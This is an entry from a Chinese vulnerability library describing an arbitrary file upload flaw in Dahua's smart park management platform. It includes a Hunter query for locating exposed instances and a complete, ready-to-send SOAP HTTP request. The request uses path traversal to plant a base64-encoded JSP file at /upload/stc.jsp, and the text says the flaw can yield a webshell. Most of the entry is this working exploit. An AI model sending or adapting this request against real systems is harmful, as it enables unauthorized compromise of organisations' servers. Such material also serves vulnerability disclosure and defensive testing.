---
fofa: "app.name="
source: "wy876 漏洞文库"
---

# 大华智慧园区综合管理平台bitmap任意文件上传漏洞

# 一、漏洞描述
大华智慧园区综合管理平台是一个集智能化、信息化、网络化、安全化为一体的智慧园区管理平台，旨在为园区提供一站式解决方案，包括安防、能源管理、环境监测、人员管理、停车管理等多个方面。 <font style="color:rgba(0, 0, 0, 0.9);">大华智慧园区综合管理平台在/emap/webservice/gis/soap/bitmap接口处存在任意文件上传漏洞，可以利用此漏洞获得webshell。</font>

# 二、影响版本
+ 大华智慧园区综合管理平台

# 三、资产测绘
+ hunter:`app.name="Dahua 大华 智慧园区管理平台"`  

+ 登录页面：


# 四、漏洞复现
```plain
POST /emap/webservice/gis/soap/bitmap HTTP/1.1
Cookie: JSESSIONID=C30EF0C843ACBDC71597DEE0CBDADE8C
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: 
Content-Length: 628

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:res="http://response.webservice.bitmap.mapbiz.emap.dahuatech.com/">
   <soapenv:Header/>
   <soapenv:Body>
      <res:uploadPicFile>
         <arg0>
 <picName>stc.jsp</picName>
                    <!--type: string-->
                    <picPath>/../stc.jsp</picPath>
         </arg0>
         <!--type: base64Binary-->
         <arg1>PCVvdXQucHJpbnQoOTk5Kjk5OSk7bmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTslPg==</arg1>
      </res:uploadPicFile>
   </soapenv:Body>
</soapenv:Envelope>
```


上传文件位置

```plain
/upload/stc.jsp
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ygkzgd2uu9gcxavq>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
